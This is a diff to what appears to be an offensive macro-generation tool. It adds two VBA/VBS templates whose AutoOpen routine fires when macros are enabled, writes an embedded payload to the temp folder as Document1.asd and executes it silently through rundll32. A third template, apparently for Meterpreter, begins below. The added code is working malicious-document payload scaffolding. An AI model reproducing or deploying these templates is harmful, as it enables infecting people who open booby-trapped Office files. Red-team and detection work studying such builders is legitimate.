@@ -211,6 +211,44 @@ End Sub
 """
 
 
+EMBED_DLL_VBS = \
+r"""
+'Option Explicit
+
+Private Sub loadEmbeddedDll()
+    DumpFile CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") & "\Document1.asd"
+    CreateObject("WScript.Shell").Run "%windir%\system32\rundll32.exe %temp%\Document1.asd,<<<DLL_FUNCTION>>>", 0
+End Sub
+
+' Auto launch when VBA enabled
+Sub AutoOpen()
+    loadEmbeddedDll
+End Sub
+
+"""
+
+EMBED_DLL_VBA = \
+r"""
+'Option Explicit
+
+Private Sub loadEmbeddedDll()
+    Dim dll_Loc As String
+    dll_Loc = Environ("AppData") & "\Microsoft\<<<APPLICATION>>>"
+    If Dir(dll_Loc, vbDirectory) = vbNullString Then
+        Exit Sub
+    End If
+    DumpFile "Document1.asd"
+    <<<MODULE_2>>>.Invoke 
+End Sub
+
+' Auto launch when VBA enabled
+Sub AutoOpen()
+    loadEmbeddedDll
+End Sub
+
+"""
+
+
 METERPRETER =  \
 r"""
 '   _____                                _____          __
